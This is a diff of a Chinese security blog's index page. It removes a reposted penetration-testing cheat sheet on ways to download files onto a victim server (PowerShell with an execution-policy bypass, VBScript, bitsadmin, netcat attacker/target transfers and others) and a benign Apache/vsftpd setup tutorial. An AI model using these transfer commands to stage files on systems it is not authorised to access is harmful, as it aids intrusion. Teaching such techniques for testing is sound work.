@@ -134,160 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
-<p>如果Powershell禁止执行了，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
-<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
-<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
-<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
-<p>复制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
-<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
-<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
-<p>target执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
-<p><strong>Netcat补充</strong>：</p>
-<p><code>传输文件</code></p>
-<p>方法一：</p>
-<p>接收端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p>传送端，发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
-<p>发送端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>接收端，连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p><code>传送目录</code></p>
-<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
-<p>接收端，先监听并准备解压缩</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
-<p>发送端，压缩并发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
-<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
-<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
-<li><ol>
-<li>打开记事本</li>
-</ol>
-</li>
-<li><ol>
-<li>文件，打开</li>
-</ol>
-</li>
-<li><ol>
-<li>在文件名处填入下载地址</li>
-</ol>
-</li>
-</ul>
-<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-CVE-2018-15877 复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1714,148 +1560,6 @@
 
 
   
-    <article id="post-Linux系统下搭建Web服务器和FTP服务器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" class="archive-article-date">
-  	<time datetime="2019-09-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web服务器安装与配置"><a href="#Web服务器安装与配置" class="headerlink" title="Web服务器安装与配置"></a>Web服务器安装与配置</h1><h2 id="Apache2和php组件的安装"><a href="#Apache2和php组件的安装" class="headerlink" title="Apache2和php组件的安装"></a>Apache2和php组件的安装</h2><p>使用如下命令来安装Apache2和php的组件</p>
-<p>Ps：如果只安装Apache2，将会导致写的php文件无法被解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br><span class="line">apt-get install php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-1.png" alt="1-1"></p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态：/etc/init.d/apache2 status（service apache2 status）</span><br><span class="line">开启：/etc/init.d/apache2 start（service apache2 start）</span><br><span class="line">关闭：/etc/init.d/apache2 stop（service apache2 stop）</span><br><span class="line">重启：/etc/init.d/apache2 restart（service apache2 restart）</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-2.png" alt="1-2"></p>
-<h2 id="网站根目录"><a href="#网站根目录" class="headerlink" title="网站根目录"></a>网站根目录</h2><p>网站根目录位于：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
-<p>创建文件时，一些文件记得修改文件对应的权限，才能访问</p>
-<h2 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h2><p>Apache2带有登录验证的功能，（1） 在<code>/etc</code>目录下创建<code>.Webpasswd</code>文件，设置登陆使用的用户名和密码。该文件为验证使用的储存用户名密码的文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-3.png" alt="1-3"></p>
-<p>修改<code>/etc/apache2/sites-available/000-default.conf</code>文件，修改内容如下图所示。</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-4.png" alt="1-4"></p>
-<p>修改完成后再去访问就会看到弹出身份认证框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-5.png" alt="1-5"></p>
-<h1 id="FTP服务器安装与配置"><a href="#FTP服务器安装与配置" class="headerlink" title="FTP服务器安装与配置"></a>FTP服务器安装与配置</h1><h2 id="vsftpd组件的安装"><a href="#vsftpd组件的安装" class="headerlink" title="vsftpd组件的安装"></a>vsftpd组件的安装</h2><p>使用如下命令来安装Apache2的组件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-1.png" alt="2-1"></p>
-<h2 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看状态：/etc/init.d/vsftpd status</span><br><span class="line">开启：/etc/init.d/vsftpd start</span><br><span class="line">关闭：/etc/init.d/vsftpd stop</span><br><span class="line">重启：/etc/init.d/vsftpd restart</span><br></pre></td></tr></table></figure>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>创建专门用于上传下载的目录（记得设置权限，不然会导致无法创建文件）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-2.png" alt="2-2"></p>
-<p>创建新用户并设置密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-3.png" alt="2-3"></p>
-<p>修改配置文件 <code>etc/vsftp.conf</code> ,在文件头添加如下内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-4.png" alt="2-4"></p>
-<p><code>取消</code>掉 <code>write_enable=YES</code> 的注释，使其生效，不然无法写入文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-5.png" alt="2-5"></p>
-<p>新建 <code>/etc/allowed_users</code> 文件，添加允许访问的用户，我们在文件中添加我们刚才创建的用户 <code>uftp</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-6.png" alt="2-6"></p>
-<p>可以查看 <code>/etc/ftpusers</code> 文件，文件中的列表是禁止访问的用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-7.png" alt="2-7"></p>
-<p>重启 <code>vsftpd</code> 服务，并查看状态</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-8.png" alt="2-8"></p>
-<h2 id="安装-ftp-命令"><a href="#安装-ftp-命令" class="headerlink" title="安装 ftp 命令"></a>安装 ftp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ftp</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-01.png" alt="2-01"></p>
-<p>至此，vsftp 服务器就安装完成了，下面简单演示一下如何用命令传输文件</p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>通过 <code>ftp + IP地址</code> 命令访问FTP服务；输入正确的用户名和密码进入服务；通过 <code>put</code> 命令来上传指定的文件。如图所示，本次实验将提前准备好的位于用户根目录下的 <code>FTP_Success.gif</code> 文件上传，<code>（local-file）</code>选项填写我们要上传的文件及其所处位置，<code>（remote-file）</code>选项填写文件上传后的位置</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-9.png" alt="2-9"></p>
-<p>通过 <code>netstat -atunp | grep ftp</code> 命令来查看ftp服务使用的端口号</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-10.png" alt="2-10"></p>
-<p>在我们的客户端（也就是我的Windows 10物理机），利用 <code>LeapFTP</code> 软件来连接服务器（也就是我的Kali Linux虚拟机）提供的FTP服务。在主界面点击左上角的 <code>FTP</code>-&gt;<code>Quick Connect</code> 来建立新连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-11.png" alt="2-11"></p>
-<p>在弹出来的对话框中输入，服务器的IP地址、端口号（默认21）、Username、Password。这里的用户名密码填写我们刚才创建的那个用户（既 <strong>uftp</strong> 这个用户）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-12.png" alt="2-12"></p>
-<p>确定后，等待一段时间，就可以在主界面的右侧看到成功连接，并且文件夹里有我们刚才上传的文件：<strong>FTP_Success.gif。</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-13.png" alt="2-13"></p>
-<p>可以右击我们想要下载的目标文件，点击 <strong>Download</strong> 来下载。下载目录可以在主界面的左侧选择，如下图，我们成功将 <strong>FTP_Success.gif</strong> 文件下载到了我物理机的桌面上。</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-14.png" alt="2-14"></p>
-<p>前面有提到 <strong>/etc/allowed_users</strong> 文件是允许访问FTP服务器的用户列表，而 <strong>/etc/ftpusers</strong> 是禁止访问FTP服务器的用户列表，现在我们看一下两个列表的名单</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-15.png" alt="2-15"></p>
-<p>可以看到现在允许访问的只有 <strong>uftp</strong> 怎么一个用户，而 root 用户是禁止访问的。现在我们在 <strong>LeapFTP</strong> 上，用 <strong>root</strong> 用户登录验证一下。可以看到，是登录失败的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-16.png" alt="2-16"></p>
-<p>现在我们将 root 用户添加到允许访问名单中，然后再登录试一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-17.png" alt="2-17"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-18.png" alt="2-18"></p>
-<p>可以看到在我们将 roor 用户添加到允许访问名单，并将之在禁止访问名单中去除后，就可以访问 FTP 服务器了，所以证明允许访问和禁止访问的名单还是有生效的。现在我们用 <strong>Wireshark</strong> 抓包来看一下 FTP 协议从建立连接到下载文件的完整过程</p>
-<p>如下图可见TCP的三次握手建立的过程。FTP分为利用TCP和UDP两类，可以看出来我们本次实验使用的是可靠地TCP</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-19.png" alt="2-19"></p>
